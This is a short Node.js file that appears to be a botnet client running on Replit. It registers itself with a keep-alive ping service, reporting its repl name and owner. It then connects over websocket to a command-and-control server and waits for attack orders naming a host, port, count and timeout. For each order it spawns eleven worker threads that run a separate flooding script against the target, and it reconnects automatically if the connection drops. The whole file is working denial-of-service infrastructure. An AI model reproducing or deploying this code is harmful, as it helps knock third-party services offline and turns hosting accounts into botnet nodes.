const { Worker } = require('worker_threads');
const io = require('socket.io-client')
const axios = require('axios')

axios.get(`https://ping-hub.repl.co/${process.env.REPL_SLUG}-${process.env.REPL_OWNER}`).then(() => {
    console.log('added')
}).catch(() => {
    console.log('failed to add')
})

const e = require('express')
const a = e()

a.get('/', (b, c) => { c.end('a'); })

let socket
let l = 0
let sending = false;

function send({ host, port, count, timeout }) {
    if (sending) return
    sending = true;
    for (i = 0; i <= 10; i++) {
        const worker = new Worker('./worker.js', {
            workerData: {
                host,
                port,
                count
            }
        });

        setTimeout(() => {
            worker.terminate()
            sending = false;
        }, timeout)
    }
}

function initSocket() {
    console.log('connecting')
    socket = io('wss://nexo.1nchh.repl.co')

    socket.on('connect', () => {
        console.log('Connected to server')
        if (l > 0) return
        l = 1
        a.listen(3032)
    })

    socket.on('message', (data) => {
        console.log(data)
        if (data.ping) return socket.send('pong')
        const { host, port, count, timeout } = data

        send({
            host,
            port,
            count,
            timeout
        })
    })

    socket.on('end', () => {
        console.log('Socket closed')
        setTimeout(initSocket, 3000)
    })

    socket.on('error', () => {
        console.log('Socket error')
        setTimeout(initSocket, 3000)
    })
}

initSocket()
